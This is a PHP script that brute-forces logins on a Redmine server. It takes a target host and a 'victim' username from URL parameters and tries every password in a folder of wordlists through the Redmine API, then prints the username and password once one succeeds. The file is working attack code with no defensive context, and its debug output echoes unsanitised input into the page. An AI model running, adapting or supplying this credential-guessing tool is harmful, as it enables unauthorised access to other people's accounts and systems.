<?php
$arena = $_GET['arena'];//anvil
$victim = $_GET['victim'];//billet
//echo ;
require_once 'vendor/autoload.php';
if (!empty($_GET['debug'])) echo "Hammering user ".$victim."@".$arena."<br/>";
try {
foreach (glob("./passwords/*.txt") as $filename) {
    if (!empty($_GET['debug'])) echo "\nLoading ".$filename."...<br/>";
$handle = fopen($filename, "r");
if ($handle) {
    while (($line = fgets($handle)) !== false) {
      $line = trim ($line);
      $client = new Redmine\Client($arena, $victim, $line);
    if (!empty($_GET['debug'])) echo $line."=>".print_r( $client->user->GetCurrentUser()[user][login],true)."(".$client->getResponseCode().")<br/>";
      $client->user->GetCurrentUser();
      if ($client->getResponseCode()==200) 
{
         fclose($handle);
         die( $victim."###".$line);
}
    }
    fclose($handle);
} else {
} }

echo "DONE.";


} catch (Exception $e) {    echo 'Exception: ',  $e->getMessage(), "\n";}

?>